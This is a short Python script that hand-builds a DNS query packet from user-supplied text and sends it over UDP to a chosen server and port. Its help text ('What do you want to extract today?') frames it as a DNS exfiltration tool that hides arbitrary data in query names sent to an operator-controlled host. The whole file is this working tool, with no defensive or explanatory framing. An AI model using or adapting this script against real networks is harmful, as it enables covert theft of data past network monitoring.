
import struct
import socket
import argparse

class DnsPacketBuilder:
    def __init__(self):
        pass

    def build_packet(self, url):
        packet = struct.pack(">H", 12049)
        packet += struct.pack(">H", 256)
        packet += struct.pack(">H", 1)
        packet += struct.pack(">H", 0)
        packet += struct.pack(">H", 0)
        packet += struct.pack(">H", 0)

        split_url = url.decode('utf-8').split(".")
        for part in split_url:
            part_bytes = part.encode('utf-8')
            packet += struct.pack("B", len(part_bytes))
            packet += struct.pack(f"{len(part_bytes)}s", part_bytes)

        packet += struct.pack("B", 0)
        packet += struct.pack(">H", 1)
        packet += struct.pack(">H", 1)
        return packet

def main():
    parser = argparse.ArgumentParser(description='Process args.')
    parser.add_argument('-t', '--dns', help='DNS server IP address', required=True)
    parser.add_argument('-p', '--port', help='DNS server port', required=True)
    parser.add_argument('-d', '--data', help='What do you want to extract today?', required=True)
    args = parser.parse_args()
    dns_ip = args.dns.encode('utf-8')
    dns_port = args.port.encode('utf-8')
    data = args.data.encode('utf-8')

    print("Sending: " + str(data))

    builder = DnsPacketBuilder()

    print("Sending packet")
    packet = builder.build_packet(data)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('', 0))
    sock.settimeout(2)
    sock.sendto(packet, (dns_ip, int(dns_port)))
    print("Packet sent")

    sock.close()

if __name__ == "__main__":
    main()
